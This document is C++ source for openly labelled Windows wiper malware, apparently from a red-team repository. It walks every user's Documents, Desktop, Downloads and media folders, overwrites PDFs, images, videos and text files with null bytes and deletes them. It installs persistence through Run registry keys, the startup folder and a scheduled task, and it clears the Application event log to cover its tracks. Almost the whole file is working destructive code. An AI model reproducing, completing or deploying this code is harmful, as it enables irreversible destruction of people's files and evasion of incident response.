/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <thread>
#include <vector>
#include <shlobj.h>
#include <mutex>
#include <condition_variable>
#include <magic.h>  // For MIME type detection (libmagic is needed)

// Globals for multithreaded scanning
std::queue<std::string> directoriesToScan;
std::mutex queueMutex;
std::condition_variable condition;
bool done = false;

// Function to overwrite a file with null bytes
void overwriteFile(const std::string& filepath) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = std::filesystem::file_size(filepath);
            for (uint64_t i = 0; i < fileSize; i++) {
                file.put(0);  // Overwriting with null bytes
            }
            file.close();
        }
        std::filesystem::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error while overwriting file: " << e.what() << "\n";
    }
}

// Function to detect file MIME type using libmagic
std::string detectMimeType(const std::string& filePath) {
    const char* mimeType;
    magic_t magic = magic_open(MAGIC_MIME_TYPE);
    magic_load(magic, NULL);
    mimeType = magic_file(magic, filePath.c_str());
    magic_close(magic);
    return std::string(mimeType);
}

// Check if the file is of a sensitive type based on MIME type detection
bool isSensitiveFileType(const std::string& filePath) {
    std::string mimeType = detectMimeType(filePath);
    return mimeType.find("application/pdf") != std::string::npos ||
           mimeType.find("image/") != std::string::npos ||
           mimeType.find("video/") != std::string::npos ||
           mimeType.find("text/") != std::string::npos;
}

// Get system directories like Documents, Desktop, etc., for the current user
std::vector<std::string> getSystemDirectories() {
    char userProfilePath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath);  // Get the current user's profile path
    
    std::vector<std::string> directories = {
        std::string(userProfilePath) + "\\Documents",
        std::string(userProfilePath) + "\\Desktop",
        std::string(userProfilePath) + "\\Downloads",
        std::string(userProfilePath) + "\\Pictures",
        std::string(userProfilePath) + "\\Music",
        std::string(userProfilePath) + "\\Videos"
    };
    
    return directories;
}

// Optionally, add more system-wide directories for all users
void addOtherUsersDirectories(std::vector<std::string>& directories) {
    std::string basePath = "C:\\Users";
    for (const auto& entry : std::filesystem::directory_iterator(basePath)) {
        if (entry.is_directory()) {
            std::string userDir = entry.path().string();
            directories.push_back(userDir + "\\Documents");
            directories.push_back(userDir + "\\Desktop");
            directories.push_back(userDir + "\\Downloads");
        }
    }
}

// Function to scan directories recursively and target specific file types
void findAndWipeFiles(const std::string& directory) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                std::string filepath = entry.path().string();

                // Exclude system files or folders
                if (filepath.find("Windows") != std::string::npos || filepath.find("System32") != std::string::npos) {
                    continue;
                }

                // Prioritize wiping sensitive file types
                if (isSensitiveFileType(filepath)) {
                    overwriteFile(filepath);  // Overwrite and delete the file
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error in directory scan: " << e.what() << "\n";
    }
}

// Worker thread function for processing directories
void directoryWorker() {
    while (true) {
        std::string directory;
        {
            std::unique_lock<std::mutex> lock(queueMutex);
            condition.wait(lock, [] { return !directoriesToScan.empty() || done; });

            if (directoriesToScan.empty()) return;
            directory = directoriesToScan.front();
            directoriesToScan.pop();
        }
        findAndWipeFiles(directory);  // Wipe files in the directory
    }
}

// Main wiper function using a thread pool for efficiency
void runWiper() {
    std::vector<std::string> directories = getSystemDirectories();  // Automatically get user directories
    addOtherUsersDirectories(directories);  // Optionally scan other users' directories

    const int numThreads = 4;  // Number of threads to use
    std::vector<std::thread> workers;

    for (int i = 0; i < numThreads; ++i) {
        workers.emplace_back(directoryWorker);  // Create worker threads
    }

    // Add directories to the queue
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        for (const auto& directory : directories) {
            directoriesToScan.push(directory);
        }
    }
    condition.notify_all();

    // Wait for all threads to finish
    {
        std::unique_lock<std::mutex> lock(queueMutex);
        done = true;
    }
    condition.notify_all();

    for (auto& worker : workers) {
        worker.join();
    }
}

// Function to add malware to the registry for persistence
void addRegistryKey(const std::string& exePath, HKEY rootKey, const std::string& keyName) {
    HKEY hKey;
    LONG regOpen = RegOpenKeyEx(rootKey, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

    if (regOpen == ERROR_SUCCESS) {
        LONG regSet = RegSetValueEx(hKey, keyName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);
        if (regSet == ERROR_SUCCESS) {
            std::cout << "Persistence added successfully to " << (rootKey == HKEY_LOCAL_MACHINE ? "HKEY_LOCAL_MACHINE" : "HKEY_CURRENT_USER") << ".\n";
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key for persistence.\n";
    }
}

// Function to add malware to startup folder
void addStartupFolder(const std::string& exePath) {
    char startupPath[MAX_PATH];
    HRESULT result = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);

    if (result == S_OK) {
        std::string shortcutPath = std::string(startupPath) + "\\malware.lnk";
        CopyFile(exePath.c_str(), shortcutPath.c_str(), FALSE);  // Copy executable to startup folder
        std::cout << "Persistence added to startup folder.\n";
    } else {
        std::cerr << "Failed to get startup folder path.\n";
    }
}

// Function to add a scheduled task for malware persistence
void addScheduledTask(const std::string& exePath) {
    std::string command = "schtasks /create /tn \"MyMalware\" /tr \"" + exePath + "\" /sc onlogon /f";
    system(command.c_str());
    std::cout << "Scheduled task for persistence added.\n";
}

// Persistence function to use multiple persistence methods
void runPersistence() {
    std::string exePath = "C:\\path\\to\\malware.exe";

    // Try registry-based persistence (HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE)
    addRegistryKey(exePath, HKEY_CURRENT_USER, "MyWiperMalware");
    addRegistryKey(exePath, HKEY_LOCAL_MACHINE, "MyWiperMalware");

    // Add to startup folder
    addStartupFolder(exePath);

    // Schedule a task for persistence
    addScheduledTask(exePath);
}

// Function to clear Windows event logs
void clearEventLogs() {
    HANDLE hEventLog = OpenEventLog(NULL, "Application");
    if (hEventLog) {
        BOOL result = ClearEventLog(hEventLog, NULL);
        if (result) {
            std::cout << "Application event log cleared.\n";
        } else {
            std::cerr << "Failed to clear Application event log.\n";
        }
        CloseEventLog(hEventLog);
    } else {
        std::cerr << "Failed to open Application event log.\n";
    }
}

// Cleanup function to clear event logs
void runCleanup() {
    clearEventLogs();  // Clear event logs
}

// Main execution entry point
int main() {
    runPersistence();  // Add persistence mechanisms
    runWiper();  // Start wiper function
    runCleanup();  // Clear event logs
    return 0;
}
